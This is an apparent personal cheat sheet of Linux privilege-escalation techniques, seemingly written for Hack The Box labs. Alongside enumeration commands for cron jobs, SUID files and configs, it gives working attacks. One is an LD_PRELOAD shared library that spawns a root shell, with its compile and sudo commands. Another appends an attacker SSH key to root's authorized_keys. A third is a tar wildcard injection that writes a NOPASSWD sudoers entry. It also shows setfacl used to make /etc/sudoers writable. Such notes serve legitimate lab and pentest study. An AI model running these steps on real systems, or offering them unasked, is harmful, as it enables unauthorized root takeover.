# Sudoers
```shell-session
$ sudo -l
```
# Group Memberships
Interesting groups to be part of:
- LXC / LXD
- Docker
- Disk
- ADM
# Cron Jobs
1. **`/etc/crontab`**
2. **`/etc/cron.d`**
3. **`/etc/cron.daily/`**
4. **`/var/spool/cron/crontabs/root`**
# Processes
Check running processes, could hint at possible VM machine, prompting [[VM Escape]].
# User Privileges
1. Sudo
2. SUID
3. Windows Token Privileges
## Sudoers
If the file `etc/sudoers` /could be made editable (for example using `setfacl`, add sudo privileges directly and `sudo su` to get root.
```bash
setfacl -m u:$USER:$perm /etc/sudoers
```
if `setfacl` can be run as sudo from low_priv user.
## Exposed Credentials
* bash_history
* mysql_history
# SSH Keys
If we have read/write access on **`.ssh`**  directory, we can get/create SSH connection.

Generate public-private key and paste the public in server
```bash
echo "ssh-rsa AAAAB...SNIP...M= user@parrot" >> /root/.ssh/authorized_keys
```
# [[Databases]]
# Environment Variables
## `env_keep+=LD_PRELOAD`
If we can run any one command as root with this environment variable, we can load our own malicious shared library here.
```C
#include <stdio.h>
#include <stdlib.h>
#include <sys/types.h>

void _init() {
    unsetenv("LD_PRELOAD");
    setgid(0);
    setuid(0);
    system("/bin/bash");
}
```

```shell-session
$ gcc -fPIC -shared -nostartfiles -o exploit.so exploit.c
$ sudo LD_PRELOAD=exploit.so <COMMAND>
```
# Capabilties

# Writeable Files/Directories
```shell-session
$ find / -path /proc -prune -o -type <f/d> -perm -o+w 2>/dev/null
```
# Hidden Files/Directories
```shell-session
$ find / -type <f/d> -name ".*" -ls 2>/dev/null
```
# History Files
```shell-session
$ find / -type f \( -name *_hist -o -name *_history \) -exec ls -l {} \; 2>/dev/null
```
# Temporary Files
```shell-session
$ ls -l /tmp /var/tmp /dev/shm
```
# Configuration Files
```shell-session
$ find / -type f \( -name *.conf -o -name *.config \) -exec ls -l {} \; 2>/dev/null
```
# SetUID/SetGID
```shell-session
$ find / -user root -perm -<4/6>000 -exec ls -ldb {} \; 2>/dev/null
```
# System Properties
## OS Release
```shell-session
$ cat /etc/os-release
```
## System Path
```shell-session
$ echo $PATH
```
## Environment Variables
```shell-session
$ env
```
## Environment
```shell-session
$ uname -a
$ lscpu
$ lsblk
$ cat /etc/shells
$ cat /etc/fstab
$ route

$ cat `/etc/resolv.conf`                  # Private DNS?
```
## Installed Applications
```shell-session
$ apt list --installed | tr "/" " " | cut -d" " -f1,3 | sed 's/[0-9]://g' | tee -a installed_pkgs.list
$ sudo -V
```
# Wildcard Abuse
When certain applications are run with wildcards, they can be abused:
Example:
```c
# cron job
*/01 * * * * cd /home/htb-student && tar -zcf /home/htb-student/backup.tar.gz *
```
```shell-session
$ echo 'echo "<user> ALL=(root) NOPASSWD: ALL" >> /etc/sudoers' > root.sh
$ echo "" > "--checkpoint-action=exec=sh root.sh"
$ echo "" > --checkpoint=1
```
This will replace the wildcard with these files which will act as flags for the `tar` command in the cron job.
# Hardening Services
Look out for system defenses such as:
- [Exec Shield](https://en.wikipedia.org/wiki/Exec_Shield)
- [iptables](https://linux.die.net/man/8/iptables)
- [AppArmor](https://apparmor.net/)
- [SELinux](https://www.redhat.com/en/topics/linux/what-is-selinux)
- [Fail2ban](https://github.com/fail2ban/fail2ban)
- [Snort](https://www.snort.org/faq/what-is-snort)
- [Uncomplicated Firewall (ufw)](https://wiki.ubuntu.com/UncomplicatedFirewall)